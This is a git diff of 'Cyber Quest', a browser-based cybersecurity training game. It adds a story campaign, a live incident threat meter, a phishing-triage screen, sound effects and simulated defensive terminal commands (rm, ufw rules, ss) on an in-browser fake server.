@@ -12,7 +12,7 @@ permalink: /cyber-quest/
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="apple-mobile-web-app-title" content="Cyber Quest">
     <meta name="theme-color" content="#0b1220">
-    <meta name="description" content="A game that takes you from beginner to advanced cybersecurity: spot phishing, read email headers and logs, find vulnerable code and run an incident response.">
+    <meta name="description" content="Defend a game studio from a hacker crew in a story-driven cybersecurity game: learn from your mentor, then fight live attacks in a real terminal.">
     <title>Cyber Quest — Learn Cybersecurity</title>
     <link rel="manifest" href="/cyber-quest/manifest.json">
     <link rel="icon" type="image/png" sizes="192x192" href="/img/cyber-quest-icon-192.png">
@@ -391,6 +391,141 @@ permalink: /cyber-quest/
         .term-done h3 { margin: 0 0 6px; }
         .term-done p { font-size: 0.9rem; margin: 0 0 10px; }
 
+        /* ── Story campaign ── */
+        .story-hero {
+            position: relative; overflow: hidden; border-radius: 18px; padding: 18px; margin-bottom: 26px;
+            background: radial-gradient(circle at 85% 10%, rgba(244, 63, 94, 0.28), transparent 45%), linear-gradient(150deg, #123b3b, #0d1526 70%);
+            border: 1px solid #2b4a52;
+        }
+        .story-hero .kicker { font-size: 0.72rem; letter-spacing: 0.16em; color: #fda4af; font-weight: 700; }
+        .story-hero h2 { margin: 4px 0 6px; font-size: 1.5rem; }
+        .story-hero p { margin: 0 0 14px; color: #cbd5e1; font-size: 0.92rem; }
+        .story-hero .btn { font-size: 1.02rem; }
+        .chapters { display: grid; gap: 6px; margin-top: 14px; }
+        .chapter {
+            display: flex; align-items: center; gap: 10px; text-align: left; width: 100%; padding: 9px 10px;
+            background: rgba(7, 13, 24, 0.55); border: 1px solid rgba(255, 255, 255, 0.07); border-radius: 10px; font-size: 0.88rem;
+        }
+        .chapter[disabled] { opacity: 0.45; cursor: not-allowed; }
+        .chapter .num { font-family: var(--mono); color: var(--muted); font-size: 0.75rem; width: 3.2em; }
+        .chapter .t { flex: 1; min-width: 0; }
+        .chapter .t small { display: block; color: var(--muted); font-size: 0.75rem; }
+        .chapter.current { border-color: var(--accent); }
+        .grounds { margin-bottom: 8px; }
+        .grounds summary {
+            list-style: none; cursor: pointer; background: var(--panel); border: 1px solid var(--line); border-radius: 14px;
+            padding: 14px 44px 14px 16px; position: relative; margin-bottom: 14px;
+        }
+        .grounds summary::-webkit-details-marker { display: none; }
+        .grounds summary::after { content: "▾"; position: absolute; right: 16px; top: 14px; color: var(--muted); transition: transform 0.2s ease; }
+        .grounds[open] summary::after { transform: rotate(180deg); }
+        .grounds-title { display: block; font-size: 1.1rem; font-weight: 800; margin-bottom: 2px; }
+
+        .story-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .story-loc { flex: 1; min-width: 0; font-family: var(--mono); font-size: 0.75rem; color: var(--muted); }
+        .story-loc b { display: block; font-family: system-ui, sans-serif; font-size: 0.95rem; color: var(--text); }
+        .stage {
+            position: relative; height: 30vh; min-height: 190px; border-radius: 18px; overflow: hidden;
+            display: grid; place-items: center; border: 1px solid #2b4a52;
+            background: radial-gradient(circle at 30% 20%, rgba(56, 189, 248, 0.25), transparent 55%), linear-gradient(160deg, #134e4a, #0b1220 75%);
+            transition: background 0.6s ease, border-color 0.6s ease;
+        }
+        #story[data-mood="night"] .stage { background: radial-gradient(circle at 75% 20%, rgba(250, 250, 210, 0.18), transparent 30%), linear-gradient(160deg, #2a1f5c, #0b1220 75%); border-color: #3b3270; }
+        #story[data-mood="alarm"] .stage {
+            background: radial-gradient(circle at 50% 45%, #6b1024, #1a0710 72%); border-color: var(--danger);
+            animation: alarmPulse 1.6s ease-in-out infinite;
+        }
+        #story[data-mood="alarm"] .stage::before {
+            content: "⚠ INCIDENT IN PROGRESS"; position: absolute; top: 10px; left: 12px; font-family: var(--mono);
+            font-size: 0.7rem; letter-spacing: 0.18em; color: #fecdd3;
+        }
+        @keyframes alarmPulse { 50% { box-shadow: inset 0 0 70px rgba(244, 63, 94, 0.5); } }
+        .stage-art { font-size: 5.2rem; line-height: 1; filter: drop-shadow(0 8px 24px rgba(0, 0, 0, 0.5)); }
+        .stage-card { position: absolute; inset: 0; display: none; place-items: center; text-align: center; padding: 20px; background: rgba(5, 9, 15, 0.55); }
+        .stage-card.show { display: grid; }
+        .stage.carded .stage-art { visibility: hidden; }
+        .stage-card .ch { font-family: var(--mono); letter-spacing: 0.25em; font-size: 0.78rem; color: #99f6e4; }
+        .stage-card h2 { margin: 6px 0; font-size: 1.9rem; }
+        .stage-card p { margin: 0; color: #cbd5e1; font-size: 0.9rem; max-width: 34ch; }
+        .stage-card .stars { font-size: 1.8rem; margin-top: 6px; }
+        .dialog {
+            margin-top: 12px; background: var(--panel); border: 1px solid var(--line); border-radius: 16px;
+            padding: 14px 16px; min-height: 160px; cursor: pointer; user-select: none;
+        }
+        #story[data-mood="alarm"] .dialog { border-color: rgba(244, 63, 94, 0.6); }
+        .speaker { display: flex; gap: 10px; align-items: center; margin-bottom: 8px; }
+        .avatar {
+            width: 46px; height: 46px; border-radius: 50%; display: grid; place-items: center; font-size: 1.6rem;
+            background: var(--panel-2); border: 2px solid var(--line); flex: 0 0 auto;
+        }
+        .speaker b { display: block; }
+        .speaker small { color: var(--muted); font-size: 0.75rem; }
+        .dialog.narr .speaker { display: none; }
+        .dialog.narr .line { font-style: italic; color: #cbd5e1; }
+        .line { font-size: 1.02rem; line-height: 1.55; margin: 0; min-height: 3em; }
+        .line code, .st-feedback code { font-family: var(--mono); font-size: 0.86em; background: #070d18; color: #b5f5d9; padding: 1px 5px; border-radius: 4px; }
+        .tap { text-align: right; font-size: 0.75rem; color: var(--muted); margin-top: 8px; animation: blink 1.6s ease-in-out infinite; }
+        .tap[hidden] { display: none; }
+        @keyframes blink { 50% { opacity: 0.35; } }
+        .choices { display: grid; gap: 8px; margin-top: 12px; }
+        .choices:empty { display: none; }
+        .st-feedback { margin-top: 10px; font-size: 0.92rem; line-height: 1.5; }
+        .st-feedback:empty { display: none; }
+        .st-feedback.good { color: #a7f3d0; }
+        .st-feedback.bad { color: #fecdd3; }
+
+        /* Live incident HUD */
+        #ops.alarm .terminal { border-color: var(--danger); box-shadow: 0 0 24px rgba(244, 63, 94, 0.18); }
+        .threat {
+            background: linear-gradient(135deg, rgba(244, 63, 94, 0.14), var(--panel)); border: 1px solid rgba(244, 63, 94, 0.55);
+            border-radius: 12px; padding: 10px 12px;
+        }
+        .threat[hidden] { display: none; }
+        .threat.hot { animation: alarmPulse 1.2s ease-in-out infinite; }
+        .threat-row { display: flex; gap: 10px; align-items: baseline; font-family: var(--mono); font-size: 0.76rem; }
+        .threat-label { flex: 1; min-width: 0; color: #fecdd3; letter-spacing: 0.05em; text-transform: uppercase; font-weight: 700; }
+        .threat-pct { font-weight: 800; color: #fff; font-size: 1rem; }
+        .threat-clock { color: var(--muted); }
+        .threat-bar { height: 10px; border-radius: 99px; background: #1a0a10; overflow: hidden; margin: 6px 0 2px; }
+        .threat-bar i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, var(--warn), var(--danger)); transition: width 0.25s linear; }
+        .feed { list-style: none; margin: 8px 0 0; padding: 0; display: grid; gap: 4px; font-family: var(--mono); font-size: 0.74rem; }
+        .feed:empty { display: none; }
+        .feed li { padding: 4px 8px; border-radius: 6px; background: rgba(0, 0, 0, 0.28); border-left: 3px solid var(--line); }
+        .feed li:first-child { animation: fade 0.25s ease; }
+        .feed-bad { color: #fecdd3; border-left-color: var(--danger) !important; }
+        .feed-warn { color: #fde68a; border-left-color: var(--warn) !important; }
+        .feed-good { color: #a7f3d0; border-left-color: var(--accent) !important; }
+        .feed-say { color: #bae6fd; border-left-color: var(--info) !important; }
+        .feed-info { color: var(--muted); }
+        .term-out .alert-bad { color: #fda4af; }
+        .term-out .alert-warn { color: #fcd34d; }
+        .term-out .alert-good { color: #6ee7b7; }
+        .term-out .alert-say, .term-out .mira { color: #7dd3fc; }
+        .term-out .alert-info { color: #64748b; }
+        .term-done.bad { background: rgba(244, 63, 94, 0.12); border-color: var(--danger); }
+        .term-done .stars { font-size: 1.4rem; }
+
+        /* Phishing rush */
+        .tr-msg { min-height: 2.8em; margin: 10px 0; font-size: 0.88rem; padding: 8px 12px; border-radius: 10px; background: var(--panel); border-left: 3px solid var(--line); }
+        .tr-msg.good { border-left-color: var(--accent); }
+        .tr-msg.bad { border-left-color: var(--danger); }
+        .tr-inbox { display: grid; gap: 10px; }
+        .tr-card { background: #f8fafc; color: #0f172a; border-radius: 14px; padding: 12px 14px; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } }
+        .tr-from { font-size: 0.86rem; }
+        .tr-addr { font-family: var(--mono); font-size: 0.78rem; color: #475569; word-break: break-all; }
+        .tr-subj { font-weight: 700; margin: 4px 0 2px; }
+        .tr-prev { font-size: 0.88rem; color: #334155; }
+        .tr-card .attach { margin-top: 6px; }
+        .tr-timer { height: 5px; background: #e2e8f0; border-radius: 99px; overflow: hidden; margin: 10px 0; }
+        .tr-timer i { display: block; height: 100%; width: 100%; background: linear-gradient(90deg, #f43f5e, #f59e0b); }
+        .tr-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .tr-actions button { border: 0; border-radius: 10px; padding: 11px; font-weight: 700; }
+        .tr-report { background: #fee2e2; color: #9f1239 !important; }
+        .tr-allow { background: #dcfce7; color: #166534 !important; }
+        .tr-results { list-style: none; padding: 0; margin: 8px 0 0; display: grid; gap: 6px; font-size: 0.86rem; }
+        .tr-results li { background: rgba(0, 0, 0, 0.2); border-radius: 8px; padding: 6px 10px; }
+
         .toast {
             position: fixed; left: 50%; transform: translateX(-50%) translateY(20px); opacity: 0;
             bottom: calc(18px + var(--safe-bottom)); background: var(--panel-2); border: 1px solid var(--accent);
@@ -414,7 +549,7 @@ permalink: /cyber-quest/
             <div class="topbar">
                 <div class="brand">
                     <img src="/img/cyber-quest-icon-192.png" alt="">
-                    <div>Cyber Quest<small>From beginner to advanced cybersecurity</small></div>
+                    <div>Cyber Quest<small>Defend the studio. Learn real security.</small></div>
                 </div>
                 <button class="icon-btn" data-go="about" aria-label="How to play">?</button>
             </div>
@@ -428,12 +563,17 @@ permalink: /cyber-quest/
                 <div class="rank-next" id="rank-next"></div>
             </div>
 
-            <p class="section-label">Your path: Beginner → Intermediate → Advanced</p>
+            <div class="story-hero" id="story-hero"></div>
+
+            <details class="grounds" id="grounds">
+            <summary><span class="grounds-title">🎯 Training Grounds</span><span class="tier-blurb">Practise any skill on its own, any time: quizzes in three tiers and terminal labs. Everything here earns XP too.</span></summary>
+            <p class="section-label">Missions · Beginner → Intermediate → Advanced</p>
             <div class="missions" id="mission-list"></div>
 
-            <p class="section-label" style="margin-top:22px">💻 Terminal Ops — hands-on command line</p>
-            <p class="tier-blurb" style="margin:-4px 2px 10px">Learn the Linux command line from zero, then defend a server with real commands. It all runs safely in your browser.</p>
+            <p class="section-label" style="margin-top:22px">💻 Terminal labs: hands-on command line</p>
+            <p class="tier-blurb" style="margin:-4px 2px 10px">Learn the Linux command line from zero, then practise on a server with real commands. It all runs safely in your browser.</p>
             <div id="lab-list"></div>
+            </details>
 
             <div class="home-links">
                 <button class="btn secondary" data-go="guide">📘 Field Guide</button>
@@ -501,6 +641,15 @@ permalink: /cyber-quest/
             <div class="topbar"><button class="icon-btn" data-go="home">← Back</button></div>
             <h2>🎮 How to play</h2>
             <p class="sub">Cyber Quest teaches the everyday security skills that stop most real attacks.</p>
+            <div class="guide-sec">
+                <h3>📖 Story: Defend Brightside</h3>
+                <ul>
+                    <li>You're the new security analyst at a small game studio, two weeks before its big launch. A hacker crew wants it. Five chapters, one per day of launch week.</li>
+                    <li>Each chapter starts <b>calm</b>: your mentor Mira teaches you, you practise in a quiet terminal, and you answer a few questions with no clock.</li>
+                    <li>Then the <b>alarm</b> goes off and the attack happens live: logs stream in, a threat meter climbs, and you fight back with what you just learned. If the meter hits 100%, you see what went wrong and try again.</li>
+                    <li>Your story is saved after every step, so you can stop at any time.</li>
+                </ul>
+            </div>
             <div class="guide-sec">
                 <h3>Missions</h3>
                 <ul>
@@ -578,8 +727,14 @@ permalink: /cyber-quest/
                 <button class="icon-btn" id="ops-quit" aria-label="Leave terminal">✕</button>
                 <div class="progress" style="font-weight:700" id="ops-name"></div>
                 <div class="count" id="ops-count"></div>
+                <button class="icon-btn" data-sound aria-label="Sound on or off">🔊</button>
             </div>
             <div class="term-wrap">
+                <div class="threat" id="ops-threat" hidden>
+                    <div class="threat-row"><span class="threat-label" id="ops-threat-label">Threat</span><span class="threat-pct" id="ops-threat-pct">0%</span><span class="threat-clock" id="ops-clock">⏱ 00:00</span></div>
+                    <div class="threat-bar"><i id="ops-threat-bar"></i></div>
+                    <ul class="feed" id="ops-feed" aria-live="polite"></ul>
+                </div>
                 <div class="lesson" id="ops-lesson" aria-live="polite"></div>
                 <div class="objectives">
                     <h3>Objectives</h3>
@@ -605,12 +760,50 @@ permalink: /cyber-quest/
                 </div>
             </div>
         </section>
+
+        <!-- Story -->
+        <section class="screen" id="story" data-mood="calm">
+            <div class="story-top">
+                <button class="icon-btn" data-go="home" aria-label="Back to HQ">✕</button>
+                <div class="story-loc"><b id="st-chapter"></b><span id="st-loc"></span></div>
+                <button class="icon-btn" data-sound aria-label="Sound on or off">🔊</button>
+            </div>
+            <div class="stage" id="st-stage"><div class="stage-art" id="st-art">🏢</div><div class="stage-card" id="st-card"></div></div>
+            <div class="dialog" id="st-dialog" tabindex="0" aria-live="polite">
+                <div class="speaker"><span class="avatar" id="st-avatar"></span><div><b id="st-name"></b><small id="st-role"></small></div></div>
+                <p class="line" id="st-text"></p>
+                <div class="choices" id="st-choices"></div>
+                <div class="st-feedback" id="st-feedback"></div>
+                <div class="tap" id="st-tap">tap to continue ▸</div>
+            </div>
+        </section>
+
+        <!-- Phishing rush -->
+        <section class="screen" id="triage">
+            <div class="hud">
+                <button class="icon-btn" id="tr-quit" aria-label="Leave">✕</button>
+                <div class="progress" style="font-weight:700">📥 Mail gateway</div>
+                <div class="count" id="tr-count"></div>
+                <button class="icon-btn" data-sound aria-label="Sound on or off">🔊</button>
+            </div>
+            <div class="threat">
+                <div class="threat-row"><span class="threat-label">Staff exposed to phishing</span><span class="threat-pct" id="tr-pct">0%</span></div>
+                <div class="threat-bar"><i id="tr-bar"></i></div>
+            </div>
+            <div class="tr-msg" id="tr-msg" aria-live="polite"></div>
+            <div class="tr-inbox" id="tr-inbox"></div>
+            <div class="term-done" id="tr-done">
+                <h3 id="tr-done-title"></h3>
+                <div id="tr-done-text"></div>
+                <div class="btn-row"><button class="btn" id="tr-continue">Continue</button></div>
+            </div>
+        </section>
     </div>
 
     <div class="toast" id="toast" role="status"></div>
 
     <script>
-    const SW_VERSION = '2610252257';
+    const SW_VERSION = '2611061244';
 
     (() => {
         'use strict';
@@ -1879,15 +2072,21 @@ permalink: /cyber-quest/
         function loadProgress() {
             try {
                 const p = JSON.parse(localStorage.getItem(STORE_KEY));
-                if (p && p.v === 1 && p.missions) { p.labs = p.labs || {}; return p; }
+                if (p && p.v === 1 && p.missions) {
+                    p.labs = p.labs || {};
+                    p.story = p.story || {};
+                    p.settings = p.settings || {};
+                    return p;
+                }
             } catch (e) { /* storage blocked */ }
-            return { v: 1, missions: {}, labs: {} };
+            return { v: 1, missions: {}, labs: {}, story: {}, settings: {} };
         }
         function saveProgress() {
             try { localStorage.setItem(STORE_KEY, JSON.stringify(progress)); } catch (e) { /* ignore */ }
         }
         const totalXp = () => Object.values(progress.missions).reduce((s, m) => s + (m.xp || 0), 0)
-            + Object.values(progress.labs || {}).reduce((s, l) => s + (l.xp || 0), 0);
+            + Object.values(progress.labs || {}).reduce((s, l) => s + (l.xp || 0), 0)
+            + Object.values(progress.story || {}).reduce((s, c) => s + (c.xp || 0), 0);
         const starsFor = (id) => (progress.missions[id] && progress.missions[id].stars) || 0;
         function isUnlocked(i) {
             const m = MISSIONS[i];
@@ -1916,6 +2115,9 @@ permalink: /cyber-quest/
             if (screen === 'home') renderHome();
             if (screen === 'guide') renderGuide();
             if (screen === 'ops') setTimeout(() => { const i = $('ops-input'); if (i) i.focus({ preventScroll: true }); }, 50);
+            if (screen !== 'ops') Ops.stopIncident();
+            if (screen !== 'triage') Triage.stop();
+            if (screen !== 'story') Story.stopTyping();
         }
 
         let toastTimer = null;
@@ -1929,6 +2131,7 @@ permalink: /cyber-quest/
 
         // ── Home / guide ──────────────────────────────────────────────────
         function renderHome() {
+            renderStoryHero();
             const xp = totalXp();
             let r = 0;
             while (r + 1 < RANKS.length && xp >= RANKS[r + 1].xp) r++;
@@ -2882,8 +3085,35 @@ permalink: /cyber-quest/
             { id: 'ops', name: 'Incidents', icon: '🚨', blurb: 'Put the basics to work on a real(istic) attack.' }
         ];
 
+        // Tiny synth for alarms and feedback; silent when muted or when audio is unavailable.
+        const Sfx = {
+            ctx: null,
+            tone(freq, dur, type, vol, delay) {
+                if (progress.settings.mute) return;
+                try {
+                    this.ctx = this.ctx || new (window.AudioContext || window.webkitAudioContext)();
+                    const c = this.ctx, t0 = c.currentTime + (delay || 0);
+                    const o = c.createOscillator(), g = c.createGain();
+                    o.type = type || 'square';
+                    o.frequency.value = freq;
+                    g.gain.setValueAtTime(vol || 0.04, t0);
+                    g.gain.exponentialRampToValueAtTime(0.0001, t0 + dur);
+                    o.connect(g).connect(c.destination);
+                    o.start(t0);
+                    o.stop(t0 + dur + 0.02);
+                } catch (e) { /* no audio */ }
+            },
+            alarm() { [880, 660, 880, 660].forEach((f, i) => this.tone(f, 0.16, 'square', 0.035, i * 0.2)); },
+            ping() { this.tone(1250, 0.07, 'sine', 0.05); },
+            hit() { this.tone(150, 0.28, 'sawtooth', 0.05); },
+            ok() { this.tone(660, 0.07, 'sine', 0.05); this.tone(990, 0.1, 'sine', 0.05, 0.08); },
+            win() { [523, 659, 784, 1047].forEach((f, i) => this.tone(f, 0.16, 'triangle', 0.05, i * 0.11)); },
+            fail() { this.tone(220, 0.35, 'sawtooth', 0.05); this.tone(147, 0.5, 'sawtooth', 0.05, 0.3); }
+        };
+        const reducedMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
         const Ops = {
-            lab: null, T: null, hist: [], histPos: 0,
+            lab: null, T: null, hist: [], histPos: 0, mode: 'lab', onDone: null, host: 'web-01', inc: null, _next: null,
 
             open(id) {
                 this.lab = LABS.find((l) => l.id === id);
@@ -2899,8 +3129,18 @@ permalink: /cyber-quest/
                 show('ops-brief');
             },
 
-            start() {
-                const l = this.lab;
+            start() { this.run(this.lab, { mode: 'lab' }); },
+
+            // Run a lab, or a story beat shaped like one:
+            // { title, icon, host, intro, chips, build, tasks, debrief, cmds, incident }.
+            run(src, opts) {
+                opts = opts || {};
+                this.stopIncident();
+                this.lab = src;
+                const l = src;
+                this.mode = opts.mode || 'lab';
+                this.onDone = opts.onDone || null;
+                this.host = src.host || 'web-01';
                 this._finished = false;
                 l.tasks.forEach((t) => { t._was = false; });
                 const b = l.build();
@@ -2909,7 +3149,7 @@ permalink: /cyber-quest/
                     history: [], read: new Set(), killedCmds: new Set(), killedPids: new Set(),
                     stoppedSvc: new Set(), disabledSvc: new Set(),
                     visited: new Set([b.cwd]), listed: new Set(), listedAll: new Set(), listedLong: new Set(),
-                    answers: new Set(), crontab: b.crontab || '',
+                    answers: new Set(), crontab: b.crontab || '', removed: new Set(), flags: new Set(), hints: 0,
                     ufw: { enabled: false, deny: new Set(), allow: new Set(), denyFrom: new Set() },
                     ran(re) { return this.history.some((c) => re.test(c)); },
                     readAbs(p) { return this.read.has(p); },
@@ -2923,17 +3163,116 @@ permalink: /cyber-quest/
                     .filter((c, i, arr) => arr.indexOf(c) === i)
                     .map((c) => `<button class="chip" data-chip="${esc(c)}">${esc(c)}</button>`).join('');
                 $('ops-prompt').textContent = this.prompt();
-                this.print('Connected to web-01. Read the 📖 lesson above, then type the command below and press Enter.', 'dim');
+                $('ops-host').textContent = 'alex@' + this.host;
+                $('ops').classList.toggle('alarm', !!l.incident);
+                $('ops-threat').hidden = !l.incident;
+                $('ops-feed').innerHTML = '';
+                $('ops-done').className = 'term-done';
+                this.print('Connected to ' + esc(this.host) + '.', 'dim');
+                // Intros are authored HTML (they may contain <code>).
+                if (l.intro) this.print(l.intro, 'mira');
+                else this.print('Read the 📖 lesson above, then type the command below and press Enter.', 'dim');
                 this.print('Stuck? <span class="hl">hint</span> shows the exact command. <span class="hl">help</span> lists every command.', 'dim');
                 this.print('');
                 this.renderObjectives();
                 show('ops');
-                setTimeout(() => $('ops-input').focus({ preventScroll: true }), 50);
+                if (l.incident) this.startIncident(l.incident);
+            },
+
+            // ── Live incidents: a threat meter, a clock, scripted events and an alert feed ──
+            startIncident(cfg) {
+                const inc = this.inc = { cfg, t: 0, danger: 0, peak: 0, last: performance.now(), fired: new Set(), next: {}, sig: '' };
+                (cfg.every || []).forEach((e, i) => { inc.next[i] = e.start != null ? e.start : e.period; });
+                $('ops-threat-label').textContent = cfg.label || 'Threat';
+                this.updateHud();
+                Sfx.alarm();
+                inc.timer = setInterval(() => this.tick(), 250);
+            },
+            stopIncident() {
+                if (this.inc && this.inc.timer) clearInterval(this.inc.timer);
+                if (this.inc) this.inc.timer = null;
+            },
+            tick() {
+                const inc = this.inc;
+                if (!inc || !inc.timer || this._finished) return;
+                const now = performance.now();
+                const dt = Math.min(1, (now - inc.last) / 1000);
+                inc.last = now;
+                if (document.hidden) return; // the attack waits while the tab is hidden
+                inc.t += dt;
+                const cfg = inc.cfg, c = this.ctx();
+                (cfg.events || []).forEach((e, i) => { if (!inc.fired.has(i) && inc.t >= e.at) { inc.fired.add(i); e.fn(c); } });
+                (cfg.every || []).forEach((e, i) => { if (inc.t >= inc.next[i]) { inc.next[i] += e.period; e.fn(c); } });
+                if (cfg.rate) inc.danger += cfg.rate(this.T) * dt;
+                if (cfg.danger) inc.danger = cfg.danger(this.T);
+                inc.danger = Math.max(0, Math.min(100, inc.danger));
+                inc.peak = Math.max(inc.peak, inc.danger);
+                this.updateHud();
+                // Events can undo an objective (a respawned process), so re-check when anything changes.
+                const sig = this.lab.tasks.map((t) => (t.check(this.T) ? 1 : 0)).join('');
+                if (sig !== inc.sig) { inc.sig = sig; this.checkTasks(); }
+                if (this._finished) return;
+                if (inc.danger >= 100) return this.fail();
+                if (cfg.endAt && inc.t >= cfg.endAt) this.finish();
+            },
+            ctx() {
+                const ops = this, T = this.T, inc = this.inc;
+                return {
+                    T, inc,
+                    log(path, line) {
+                        const n = ops.nodeAt(path);
+                        if (n && n.type === 'file') n.content += line + '\n';
+                    },
+                    alert(text, lvl) { ops.alert(text, lvl || 'warn'); },
+                    say(who, text) { ops.alert(CHARS[who].avatar + ' ' + CHARS[who].name + ': ' + text, 'say'); },
+                    bump(n) { inc.danger = Math.min(100, inc.danger + n); },
+                    spawn(p) { T.procs.push(p); },
+                    exists(path) { return !!ops.nodeAt(path); },
+                    node(path) { return ops.nodeAt(path); }
+                };
+            },
+            alert(text, lvl) {
+                const li = document.createElement('li');
+                li.className = 'feed-' + lvl;
+                li.textContent = text;
+                const feed = $('ops-feed');
+                feed.prepend(li);
+                while (feed.children.length > 3) feed.lastChild.remove();
+                this.print(esc(text), 'alert-' + lvl);
+                if (lvl === 'bad') Sfx.hit(); else if (lvl === 'warn' || lvl === 'say') Sfx.ping();
+            },
+            updateHud() {
+                const inc = this.inc;
+                const pct = Math.round(inc.danger);
+                $('ops-threat-pct').textContent = pct + '%';
+                $('ops-threat-bar').style.width = pct + '%';
+                $('ops-threat').classList.toggle('hot', pct >= 70);
+                const s = Math.floor(inc.t);
+                $('ops-clock').textContent = '⏱ ' + String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
+            },
+            fail() {
+                if (this._finished) return;
+                this._finished = true;
+                this.stopIncident();
+                Sfx.fail();
+                if (navigator.vibrate) navigator.vibrate([120, 60, 120]);
+                $('ops-done-title').textContent = '💥 Breached';
+                $('ops-done-text').innerHTML = esc(this.lab.incident.failText) + ' <span class="dim">Nothing is lost: you can try again right away.</span>';
+                $('ops-done').className = 'term-done show bad';
+                $('ops-continue').textContent = '↻ Try again';
+                const src = this.lab, mode = this.mode, onDone = this.onDone;
+                this._next = () => this.run(src, { mode, onDone });
+                $('ops-done').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            },
+            continue() {
+                const next = this._next;
+                this._next = null;
+                if (next) next(); else show('home');
             },
 
             prompt() {
                 const short = this.T.cwd.replace('/home/alex', '~');
-                return 'alex@web-01:' + short + '$';
+                return 'alex@' + this.host + ':' + short + '$';
             },
 
             print(html, cls) {
@@ -3016,10 +3355,12 @@ permalink: /cyber-quest/
                 const pos = args.filter((x, k) => !x.startsWith('-') && !(nIdx >= 0 && k === nIdx + 1));
                 const flags = args.filter((x) => x.startsWith('-')).join('');
 
+                if (this.lab.cmds && this.lab.cmds[cmd]) return this.lab.cmds[cmd](args, this);
                 switch (cmd) {
                     case undefined: return {};
                     case 'help': return { out: [{ html: HELP }] };
                     case 'hint': {
+                        T.hints++;
                         const t = this.lab.tasks.find((t) => !t.check(T));
                         return { out: [{ html: t ? '💡 ' + esc(t.hint) : 'All objectives complete — type any command, you\'re done!', cls: 'hl' }] };
                     }
@@ -3069,6 +3410,7 @@ permalink: /cyber-quest/
                     case 'top': return this.ps();
                     case 'kill': return this.kill(pos);
                     case 'chmod': return this.chmod(pos);
+                    case 'rm': return this.rm(pos, flags);
                     case 'ss': case 'netstat': return this.ss();
                     case 'ufw': return this.ufw(args);
                     case 'systemctl': case 'service': return this.systemctl(args);
@@ -3196,6 +3538,23 @@ permalink: /cyber-quest/
                 return { out: [{ html: '<span class="ok">[+] process ' + pid + ' (' + esc(proc.cmd) + ') terminated</span>' }] };
             },
 
+            rm(pos, flags) {
+                if (!pos.length) return { err: ['rm: missing operand'] };
+                const out = [];
+                for (const p of pos) {
+                    const n = this.nodeAt(p);
+                    const abs = this.resolve(p);
+                    if (!n || abs === '/') { out.push({ text: '', html: '<span class="err">rm: cannot remove \'' + esc(p) + '\': No such file or directory</span>' }); continue; }
+                    if (n.type === 'dir' && !flags.includes('r')) { out.push({ text: '', html: '<span class="err">rm: cannot remove \'' + esc(p) + '\': Is a directory (use rm -r)</span>' }); continue; }
+                    const dir = abs.replace(/\/[^/]*$/, '') || '/';
+                    delete this.nodeAt(dir).children[abs.split('/').pop()];
+                    this.T.removed.add(abs);
+                    this.T.listed.delete(dir); // an earlier ls of the folder is now out of date
+                    out.push({ html: '<span class="ok">[+] removed ' + esc(p) + '</span>' });
+                }
+                return { out };
+            },
+
             chmod(pos) {
                 const mode = pos[0]; const target = pos[1];
                 if (!mode || !target) return { err: ['chmod: missing operand'] };
@@ -3208,11 +3567,14 @@ permalink: /cyber-quest/
             },
 
             ss() {
-                const out = ['Netid State  Local Address:Port   Process'];
+                const out = ['Netid State  Local Address:Port   Peer / Process'];
                 this.T.net.forEach((s) => {
-                    const warn = s.port === 23 || s.port === 3306 || s.port === 21;
-                    const line = s.proto.padEnd(5) + ' LISTEN ' + (s.addr + ':' + s.port).padEnd(20) + ' ' + s.proc;
-                    out.push({ text: line, html: warn ? '<span class="hl">' + esc(line) + '  ⚠ public</span>' : esc(line) });
+                    if (s.svc && this.T.stoppedSvc.has(s.svc)) return; // a stopped service no longer listens
+                    if (s.gone && s.gone(this.T)) return;
+                    const est = s.state === 'ESTAB';
+                    const line = s.proto.padEnd(5) + ' ' + (est ? 'ESTAB ' : 'LISTEN') + ' ' + (s.addr + ':' + s.port).padEnd(20) + ' ' + (est ? s.peer + '  ' : '') + s.proc;
+                    const warn = !est && [21, 23, 3306, 8080].includes(s.port);
+                    out.push({ text: line, html: warn ? '<span class="hl">' + esc(line) + '  ⚠ public</span>' : est ? '<span class="hl">' + esc(line) + '  ⚠ outbound</span>' : esc(line) });
                 });
                 return { out };
             },
@@ -3228,11 +3590,21 @@ permalink: /cyber-quest/
                     return { out: rows };
                 }
                 if (sub === 'enable') { T.ufw.enabled = true; return { out: [{ html: '<span class="ok">Firewall is active and enabled on system startup</span>' }] }; }
+                if (sub === 'delete') {
+                    const what = args.slice(2).join(' ');
+                    if (args[2] === 'from') T.ufw.denyFrom.delete(args[3]); else T.ufw.deny.delete(what.replace(/\/tcp|\/udp/, ''));
+                    return { out: [{ html: '<span class="ok">Rule deleted: ' + esc(args.slice(1).join(' ')) + '</span>' }] };
+                }
                 if (sub === 'deny' || sub === 'allow') {
-                    if (args[1] === 'from') { T.ufw.denyFrom.add(args[2]); return { out: [{ html: '<span class="ok">Rule added: ' + sub + ' from ' + esc(args[2] || '') + '</span>' }] }; }
+                    if (args[1] === 'from') {
+                        if (!args[2]) return { err: ['ERROR: ufw ' + sub + ' from needs an address, e.g. ufw deny from 192.0.2.1'] };
+                        if (sub === 'deny') T.ufw.denyFrom.add(args[2]); else T.ufw.denyFrom.delete(args[2]);
+                        return { out: [{ html: '<span class="ok">Rule added: ' + sub + ' from ' + esc(args[2]) + '</span>' }] };
+                    }
                     const port = (args[1] || '').replace(/\/tcp|\/udp/, '');
                     if (!port) return { err: ['ERROR: wrong number of arguments'] };
                     T.ufw[sub].add(port);
+                    if (sub === 'allow') T.ufw.deny.delete(port); else T.ufw.allow.delete(port);
                     return { out: [{ html: '<span class="ok">Rule added: ' + sub + ' ' + esc(port) + '</span>' }] };
                 }
                 return { err: ['ufw: unknown command (try: ufw status, ufw deny <port>, ufw deny from <ip>)'] };
@@ -3271,7 +3643,7 @@ permalink: /cyber-quest/
                 $('ops-count').textContent = done + '/' + tasks.length;
                 // The lesson for the first unfinished step (lesson HTML is authored content).
                 const t = tasks[cur];
